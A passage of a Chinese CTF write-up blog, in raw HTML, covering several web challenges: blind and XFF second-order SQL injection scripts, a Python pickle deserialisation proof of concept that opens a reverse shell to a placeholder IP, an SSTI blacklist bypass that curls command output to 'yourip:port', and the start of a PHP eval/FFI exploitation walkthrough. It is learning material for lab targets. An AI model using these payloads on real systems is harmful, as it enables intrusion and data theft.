class="comment">//可以发现username为注入点，password因为有md5加密，所以构不成注入。fuzz时还发现过滤了  // ‘ 根据语句，可以使用\逃逸引号，并用#闭合构造查询语句</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//register.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>) <span class="keyword">AND</span> <span class="keyword">die</span>(<span class="string">&quot;Direct access on this script is not allowed!&quot;</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;db.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">(preg_match(<span class="string">&#x27;/(a|d|m|i|n)/&#x27;</span>, strtolower(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>])) <span class="keyword">OR</span> strlen(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &lt; <span class="number">6</span> <span class="keyword">OR</span> strlen(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &gt; <span class="number">10</span> <span class="keyword">OR</span> !ctype_alnum(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>])) <span class="keyword">AND</span> <span class="variable">$con</span>-&gt;close() <span class="keyword">AND</span> <span class="keyword">die</span>(<span class="string">&quot;Not allowed!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&#x27;INSERT INTO `ptbctf`.`ptbctf` (`username`, `password`) VALUES (&quot;&#x27;</span> . <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] . <span class="string">&#x27;&quot;,&quot;&#x27;</span> . md5(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) . <span class="string">&#x27;&quot;)&#x27;</span>;</span><br><span class="line">(<span class="variable">$con</span>-&gt;query(<span class="variable">$sql</span>) === <span class="literal">TRUE</span> <span class="keyword">AND</span> <span class="variable">$con</span>-&gt;close() <span class="keyword">AND</span> <span class="keyword">die</span>(<span class="string">&quot;The user was created successfully!&quot;</span>)) <span class="keyword">OR</span> (<span class="variable">$con</span>-&gt;close() <span class="keyword">AND</span> <span class="keyword">die</span>(<span class="string">&quot;Error!&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"> <span class="comment">//要求注册只能为admin</span></span><br></pre></td></tr></table></figure>
<p>php.ini中有一些关于session的配置：<br>**在phpsession里如果在php.ini中设置session.auto_start=On，那么PHP每次处理PHP文件的时候都会自动执行session_start()，但是session.auto_start默认为Off。与Session相关的另一个叫session.upload_progress.enabled，默认为On，在这个选项被打开的前提下我们在multipart POST的时候传入PHP_SESSION_UPLOAD_PROGRESS，PHP会执行session_start()**，看一下官方文档</p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu64.jpg"></p>
<p>比如说，我们可以通过如下脚本生成session文件<code>sess_test1</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://127.0.0.1/test/1.php&#x27;</span></span><br><span class="line">files=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="number">123</span>&#125;</span><br><span class="line">re=requests.post(url,files=files,data=&#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="string">&quot;123456789&quot;</span>&#125;,cookies=&#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;test1&quot;</span>&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&quot;http://fbafea7b-8e0f-4924-9ec3-4b0046577031.node3.buuoj.cn/templates/login.php&quot;</span></span><br><span class="line">files = &#123;<span class="string">&quot;file&quot;</span>: <span class="string">&quot;123456789&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">128</span></span><br><span class="line">    mid = (low+high)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> (low &lt; high):</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">               payload_flag = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;test\&quot; or (ascii(substr((select group_concat(secret) from flag_tbl ),&#123;0&#125;,1))&gt;&#123;1&#125;) #&quot;</span>.<span class="built_in">format</span>(i,mid),<span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;test&#x27;</span>&#125;</span><br><span class="line">        r = requests.post(url=url,params=payload_flag,files=files, data=&#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="string">&quot;123456789&quot;</span>&#125;,</span><br><span class="line">                  cookies=&#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;test1&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#print(payload_flag)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;again&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid +<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span>(mid==<span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">132</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag +=<span class="built_in">chr</span>(mid)</span><br><span class="line">    print(flag)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>


<h2 id="RoarCTF-2019-Online-Proxy-1"><a href="#RoarCTF-2019-Online-Proxy-1" class="headerlink" title="[RoarCTF 2019]Online Proxy"></a>[RoarCTF 2019]Online Proxy</h2><p>知识点：XFF二次注入</p>
<p>wp网上很多师傅们都写得很详细了，再写主要是记录下赵师傅则是将字符转为数字直接输出的骚操作，效率高得多，贴出来学习一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">target = <span class="string">&quot;http://node3.buuoj.cn:25488/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_sql</span>(<span class="params">sql</span>):</span></span><br><span class="line">    print(<span class="string">&quot;[*]请求语句：&quot;</span> + sql)</span><br><span class="line">    return_result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&quot;0&#x27;|length((&quot;</span> + sql + <span class="string">&quot;))|&#x27;0&quot;</span></span><br><span class="line">    print(payload)</span><br><span class="line">    session = requests.session()</span><br><span class="line">    r = session.get(target, headers=&#123;<span class="string">&#x27;X-Forwarded-For&#x27;</span>: payload&#125;)</span><br><span class="line">    r = session.get(target, headers=&#123;<span class="string">&#x27;X-Forwarded-For&#x27;</span>: <span class="string">&#x27;glzjin&#x27;</span>&#125;)</span><br><span class="line">    r = session.get(target, headers=&#123;<span class="string">&#x27;X-Forwarded-For&#x27;</span>: <span class="string">&#x27;glzjin&#x27;</span>&#125;)</span><br><span class="line">    start_pos = r.text.find(<span class="string">&quot;Last Ip: &quot;</span>)</span><br><span class="line">    end_pos = r.text.find(<span class="string">&quot; --&gt;&quot;</span>, start_pos)</span><br><span class="line">    length = <span class="built_in">int</span>(r.text[start_pos + <span class="number">9</span>: end_pos])</span><br><span class="line">    print(<span class="string">&quot;[+]长度：&quot;</span> + <span class="built_in">str</span>(length))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>, length + <span class="number">1</span>, <span class="number">5</span>):</span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">        payload = <span class="string">&quot;0&#x27;|conv(hex(substr((&quot;</span> + sql + <span class="string">&quot;),&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;,5)),16,10)|&#x27;0&quot;</span></span><br><span class="line">        print(payload)</span><br><span class="line"></span><br><span class="line">        r = session.get(target, headers=&#123;<span class="string">&#x27;X-Forwarded-For&#x27;</span>: payload&#125;)</span><br><span class="line">        r = session.get(target, headers=&#123;<span class="string">&#x27;X-Forwarded-For&#x27;</span>: <span class="string">&#x27;glzjin&#x27;</span>&#125;)</span><br><span class="line">        r = session.get(target, headers=&#123;<span class="string">&#x27;X-Forwarded-For&#x27;</span>: <span class="string">&#x27;glzjin&#x27;</span>&#125;)</span><br><span class="line">        start_pos = r.text.find(<span class="string">&quot;Last Ip: &quot;</span>)</span><br><span class="line">        end_pos = r.text.find(<span class="string">&quot; --&gt;&quot;</span>, start_pos)</span><br><span class="line">        result = <span class="built_in">int</span>(r.text[start_pos + <span class="number">9</span>: end_pos])</span><br><span class="line">        print(result)</span><br><span class="line">        return_result += <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(result)[<span class="number">2</span>:]).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        print(<span class="string">&quot;[+]位置 &quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot; 请求五位成功:&quot;</span> + <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(result)[<span class="number">2</span>:]).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> return_result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># # 获取数据库</span></span><br><span class="line"><span class="comment"># print(&quot;[+]获取成功：&quot; + execute_sql(&quot;SELECT group_concat(SCHEMA_NAME) FROM information_schema.SCHEMATA&quot;))</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># # 获取数据库表</span></span><br><span class="line"><span class="comment"># print(&quot;[+]获取成功：&quot; + execute_sql(&quot;SELECT group_concat(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA = &#x27;F4l9_D4t4B45e&#x27;&quot;))</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># # 获取数据库表</span></span><br><span class="line"><span class="comment"># print(&quot;[+]获取成功：&quot; + execute_sql(&quot;SELECT group_concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = &#x27;F4l9_D4t4B45e&#x27; AND TABLE_NAME = &#x27;F4l9_t4b1e&#x27; &quot;))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取表中内容</span></span><br><span class="line">print(<span class="string">&quot;[+]获取成功：&quot;</span> + execute_sql(<span class="string">&quot;SELECT group_concat(F4l9_C01uMn) FROM F4l9_D4t4B45e.F4l9_t4b1e&quot;</span>))</span><br></pre></td></tr></table></figure>
<p>由于BUU 429的原因，<code>  for i in range(50, length + 1, 5):</code>这里范围可以修改下，脚本多跑几次可以得出flag</p>
<h2 id="watevrCTF-2019-Pickle-Store"><a href="#watevrCTF-2019-Pickle-Store" class="headerlink" title="[watevrCTF-2019]Pickle Store"></a>[watevrCTF-2019]Pickle Store</h2><p>知识点：python反序列化  <a href="https://xz.aliyun.com/t/7320">https://xz.aliyun.com/t/7320</a></p>
<p>看到题目名字，第一反应就是python反序列化</p>
<p>进入环境，买黄瓜，对于这种购物类的web题，切入点一般在<code>cookie</code>，买黄瓜，抓包，cookie尝试base64解密。</p>
<p>虽然有乱码，但是发现还是挺像点什么的。再结合题目中的“Pickle”，联想到Python反序列化。这cookie可能就是先经过Pickle序列化然后再进行base64加密的数据。</p>
<p>我们编写如下脚本，将原始的cookie数据给反序列胡出来：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">result = pickle.loads(base64.b64decode(<span class="string">b&#x27;gAN9cQAoWAUAAABtb25leXEBTfQBWAcAAABoaXN0b3J5cQJdcQNYEAAAAGFudGlfdGFtcGVyX2htYWNxBFggAAAAYWExYmE0ZGU1NTA0OGNmMjBlMGE3YTYzYjdmOGViNjJxBXUu&#x27;</span>))</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>
<p>得到：</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">PYTHON</span><br><span class="line">&#123;&#x27;money&#x27;: <span class="number">500</span>, &#x27;history&#x27;: [], &#x27;anti_tamper_hmac&#x27;: &#x27;aa1ba4de<span class="number">5504</span>8cf20e0a7a63b7f8eb62&#x27;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>确实是我们所猜测的。</p>
<p>那我们便可以将我们pickle反序列话的payload进行base64加密，然后放入到cookie中，当服务器再获取我们cookie并进行反序列化时，便会触发payload。</p>
<p>编写如下POC进行反弹shell：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/47.xxx.xx.xx/2333 0&gt;&amp;1\&quot;&#x27;)&quot;</span>,))</span><br><span class="line">poc = A()</span><br><span class="line">result = pickle.dumps(poc)</span><br><span class="line">result = base64.b64encode(result)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>
<p>得到伪造的cookie，将其设置为cookie的值，并且在本地开启监听，然后点击Buy：</p>
<p><img src="http://img.npfs06.top/20210224221309.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="GWCTF-2019-你的名字"><a href="#GWCTF-2019-你的名字" class="headerlink" title="[GWCTF 2019]你的名字"></a>[GWCTF 2019]你的名字</h2><p>知识点：</p>
<ol>
<li>SSTI</li>
<li>黑名单过滤逻辑错误</li>
</ol>
<blockquote>
<p>很详细的SSTI&gt;&gt;：<a href="https://xz.aliyun.com/t/6885#toc-4">https://xz.aliyun.com/t/6885#toc-4</a></p>
</blockquote>
<blockquote>
<p>SSTIbypass姿势&gt;&gt;<a href="https://p0sec.net/index.php/archives/120/">https://p0sec.net/index.php/archives/120/</a></p>
</blockquote>
<p>打开题目，只有一个输入框，尝试输入<code>&#123;&#123;7*7&#125;&#125;</code>，不管怎么改，返回的结果都是一样的，说明可能<code>&#123;&#123;&#125;&#125;`被过滤了；过滤的字符串给了个PHP的报错，还给了一个不存在的文件，又把路由设置了一个`index.php`

**模板规则**

> `&#123;&#123;...&#125;&#125;</code>装载一个变量，模板渲染的时候，会使用传进来的同名参数这个变量代表的值替换掉。</p>
<blockquote>
<p><code>&#123;% ... %&#125;</code>：装载一个控制语句。<br><code>&#123;# ... #&#125;</code>：装载一个注释，模板渲染的时候会忽视这中间的值。</p>
</blockquote>
<p><strong>但是可以通过 <code>&#123;%%&#125;</code> 类似的方式来进行注入，尝试 <code>&#123;%if 1%&#125;1&#123;% endif%&#125;</code></strong> ，发现服务器直接给出500错误。。。判断可能有什么过滤</p>
<p>直接输入if，返回结果是：</p>
<figure class="highlight erlang-repl"><table><tr><td class="code"><pre><span class="line">hello ! </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>说明if被替换为空了，尝试双写iiff，但是还是被替换为空了，可能是用的循环匹配。</p>
<p>说明if被替换为空了，尝试双写iiff，但是还是被替换为空了，可能是用的循环匹配。</p>
<p>参考了师傅写的wp，fuzz出来的过滤可能是这个样子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">blacklist = [<span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;getattr&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;subclasses&#x27;</span>, <span class="string">&#x27;mro&#x27;</span>, <span class="string">&#x27;request&#x27;</span>, <span class="string">&#x27;args&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>,</span><br><span class="line">                 <span class="string">&#x27;if&#x27;</span>, <span class="string">&#x27;for&#x27;</span>,<span class="string">&#x27; subprocess&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>, <span class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>,</span><br><span class="line">                 <span class="string">&#x27;execfile&#x27;</span>, <span class="string">&#x27;from_pyfile&#x27;</span>, <span class="string">&#x27;local&#x27;</span>,<span class="string">&#x27;self&#x27;</span>, <span class="string">&#x27;item&#x27;</span>, <span class="string">&#x27;getitem&#x27;</span>, <span class="string">&#x27;getattribute&#x27;</span>, </span><br><span class="line">                 <span class="string">&#x27;func_globals&#x27;</span>, <span class="string">&#x27;config&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> no <span class="keyword">in</span> blacklist:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> no <span class="keyword">in</span> s:</span><br><span class="line">            s = s.replace(no, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">return</span> s</span><br></pre></td></tr></table></figure>
<p>考察黑名单过滤逻辑错误，这种过滤，利用黑名单中最后一个词进行混淆来过滤是最好了，即 <code>if=&gt;iconfigf</code> ，因为是用黑名单的关键词按顺序来对输入进行替换的，那么最后一个 <code>config</code> 被替换之后，过滤也就结束了。</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> &#x27;&#x27;.<span class="module-access"><span class="module"><span class="identifier">__class__</span>.</span><span class="module"><span class="identifier">__mro__</span>[</span></span><span class="number">2</span>];.<span class="constructor">__subclasses__()</span><span class="literal">[<span class="number">59</span>]</span>;.<span class="module-access"><span class="module"><span class="identifier">__init__</span>.</span></span>func_globals.linecache.os.popen(&#x27;curl http:<span class="comment">//yourip:port/ -d ls / | grep flag;&#x27;) %&#125;1&#123;% endif %&#125;</span></span><br><span class="line">#相当于把ls的结果进行base64编码后（不然只能显示一行），以curl的方式发送到攻击机</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>nc监听即可</p>
<h2 id="RCTF-2019-Nextphp"><a href="#RCTF-2019-Nextphp" class="headerlink" title="[RCTF 2019]Nextphp"></a>[RCTF 2019]Nextphp</h2><p>知识点：PHP7.4特性FFI</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">123456</span></span><br></pre></td></tr></table></figure>
<p>尝试利用eval</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">a</span>=echo system(<span class="string">&quot;ls&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>报错，system()函数被禁止了</p>
<p>尝试查看phpinfo();</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">a</span>=phpinfo();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>查看成功,</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">收集一波phpinfo的信息</span><br><span class="line"></span><br><span class="line">disable_functions	set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,putenv,error_log,dl</span><br><span class="line"></span><br><span class="line">open_basedir	<span class="regexp">/var/</span>www/html</span><br><span class="line"></span><br><span class="line">opcache.preload	<span class="regexp">/var/</span>www<span class="regexp">/html/</span>preload.php</span><br><span class="line"></span><br><span class="line">FFI</span><br><span class="line">FFI support	enabled</span><br><span class="line">disable_classes	ReflectionClass	ReflectionClass</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>接下来使用其中没有过滤的函数进行渗透:</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">?a=echo var<span class="constructor">_dump(<span class="params">scandir</span>(<span class="string">&quot;/var/www/html/&quot;</span>)</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>返回结果如下:</p>
<figure class="highlight sml"><table><tr><td class="code"><pre><span class="line"><span class="built_in">array</span>(<span class="number">4</span>) &#123; [<span class="number">0</span>]=&gt; <span class="built_in">string</span>(<span class="number">1</span>) <span class="string">&quot;.&quot;</span> [<span class="number">1</span>]=&gt; <span class="built_in">string</span>(<span class="number">2</span>) <span class="string">&quot;..&quot;</span> [<span class="number">2</span>]=&gt; <span class="built_in">string</span>(<span class="number">9</span>) <span class="string">&quot;index.php&quot;</span> [<span class="number">3</span>]=&gt; <span class="built_in">string</span>(<span class="number">11</span>) <span class="string">&quot;preload.php&quot;</span> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>查看preload.php的内容:</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">/<span class="string">?a</span>=show_source(<span class="string">&quot;/var/www/html/preload.php&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>得到如下代码:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$data</span> = [</span><br><span class="line">        <span class="string">&#x27;ret&#x27;</span> =&gt; <span class="literal">null</span>,</span><br><span class="line">        <span class="string">&#x27;func&#x27;</span> =&gt; <span class="string">&#x27;print_r&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;arg&#x27;</span> =&gt; <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">&#x27;ret&#x27;</span>] = <span class="keyword">$this</span>-&gt;data[<span class="string">&#x27;func&#x27;</span>](<span class="keyword">$this</span>-&gt;data[<span class="string">&#x27;arg&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__serialize</span>(<span class="params"></span>): <span class="title">array</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">        array_merge(<span class="keyword">$this</span>-&gt;data, <span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> (<span class="params"></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span>(<span class="params"><span class="variable">$payload</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = unserialize(<span class="variable">$payload</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span> (<span class="params"><span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[<span class="variable">$key</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span> (<span class="params"><span class="variable">$key</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="built_in">Exception</span>(<span class="string">&#x27;No implemented&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="built_in">Exception</span>(<span class="string">&#x27;No implemented&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>里面定义了一个可以反序列化执行任意函数的类,利用下面的脚本生成一个序列化对象:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$data</span> = [</span><br><span class="line">        <span class="string">&#x27;ret&#x27;</span> =&gt; <span class="literal">null</span>,</span><br><span class="line">        <span class="string">&#x27;func&#x27;</span> =&gt; <span class="string">&#x27;print_r&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;arg&#x27;</span> =&gt; <span class="string">&#x27;666&#x27;</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">&#x27;ret&#x27;</span>] = <span class="keyword">$this</span>-&gt;data[<span class="string">&#x27;func&#x27;</span>](<span class="keyword">$this</span>-&gt;data[<span class="string">&#x27;arg&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__serialize</span>(<span class="params"></span>): <span class="title">array</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">        array_merge(<span class="keyword">$this</span>-&gt;data, <span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> (<span class="params"></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span>(<span class="params"><span class="variable">$payload</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = unserialize(<span class="variable">$payload</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span> (<span class="params"><span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[<span class="variable">$key</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span> (<span class="params"><span class="variable">$key</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span 